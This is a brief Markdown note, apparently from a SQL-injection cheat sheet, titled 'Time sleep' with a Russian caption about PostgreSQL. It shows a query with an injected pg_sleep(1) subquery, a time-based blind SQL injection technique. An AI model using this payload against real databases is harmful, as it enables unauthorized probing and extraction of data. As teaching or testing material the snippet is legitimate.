# Time sleep

На примере с postgres:

```sql
SELECT * FROM accounts 
WHERE username LIKE '' 
OR FALSE IN (SELECT pg_sleep(1) IS NULL AS username);
```
